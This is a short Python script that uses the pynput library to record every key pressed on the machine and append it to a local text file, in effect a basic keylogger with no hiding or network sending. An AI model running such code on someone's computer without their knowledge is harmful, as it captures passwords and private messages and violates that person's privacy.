from pynput import keyboard

LOG_FILE = "keyboard_logger.txt"

def on_press(key):
    with open(LOG_FILE,"a") as f:
        text = ""
        try: 
            text += f"{key.char}"
        except AttributeError:
            skey = f"{key}"
            if "Key." in skey:
                text += f"<{skey.replace('Key.','')}>"
            else:
                text += f"<{skey}> "
                 
        f.write(text)
  
def on_release(key):
    return True 

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()